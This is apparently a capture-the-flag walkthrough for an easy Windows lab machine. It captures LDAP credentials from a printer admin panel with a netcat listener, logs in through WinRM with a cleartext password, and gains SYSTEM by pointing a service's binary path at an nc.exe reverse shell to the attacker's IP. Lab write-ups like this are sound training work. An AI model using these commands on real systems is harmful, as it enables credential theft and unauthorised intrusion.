@@ -1,0 +1,73 @@
+Return
+
+ 27th May 2021 / Document No D21.101.183
+ Prepared By: MrR3boot
+ Machine Author(s): MrR3boot
+ Difficulty: Easy
+ Classification: Official
+Synopsis
+
+Return is an easy difficulty Windows machine featuring a network printer administration panel that stores
+LDAP credentials. These credentials can be captured by inputting a malicious LDAP server which allows
+obtaining foothold on the server through the WinRM service. User found to be part of a privilege group
+which further exploited to gain system access.
+
+Skills Required
+
+      Basic Windows Knowledge
+      Beginner Active Directory Knowledge
+
+Skills Learned
+
+      Network Printer Abuse
+      Server Operators Group Abuse
+Enumeration
+
+Nmap
+
+Let's start with port scan.
+   ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.233 | grep ^[0-9] | cut -d '/' -f 1 | tr
+   '\n' ',' | sed s/,$//)
+   nmap -p$ports -sV -sC 10.10.10.233
+
+Nmap output shows that the target is a Windows machine with ports 80 (Internet Information Services), 445
+(SMB) and 5985 (Windows Remote Management) available.
+
+SMB
+
+Let's enumerate SMB service using enum4linux tool.
+
+This reveals that the host is part of the RETURN domain. SMB does not allow NULL or guest sessions, so can
+turn our attention to the website.
+IIS
+
+This reveals a printer admin panel, such as you find on enterprise Canon, Xerox and Epson multifunction
+devices. Navigating to Settings reveals a username and domain name.
+
+Foothold
+
+These devices store LDAP and SMB credentials, in order for the printer to query the user list from Active
+Directory, and to be able to save scanned files to a user drive. These configuration pages typically allow the
+domain controller or file server to be specified. Let's stand up a listener on port 389 (LDAP) and specify our
+tun0 IP address in the Server address field.
+   sudo nc -lvnp 389
+
+A connection is received, and the credentials of svc-printer is revealed. From portscan we see WinRM
+port is open. Let's connect to the service using evil-winrm tool.
+
+   gem install evil-winrm
+   evil-winrm -i 10.10.10.233 -u svc-printer -p '1edFg43012!!'
+Privilege Escalation
+
+Enumerating group memberships reveals that svc-printer is part of Server Operators group.
+
+We can read more about this group here. Members of this group can start/stop system services. Let's
+modify a service binary path to obtain reverse shell.
+
+   upload /usr/share/windows-resources/binaries/nc.exe
+   sc.exe config vss binPath="C:\Users\svc-printer\Documents\nc.exe -e cmd.exe 10.10.14.2
+   1234"
+Stand up a listener on port 1234 and issue below commands to obtain reverse shell.
+   sc.exe stop vss
+   sc.exe start vss
+
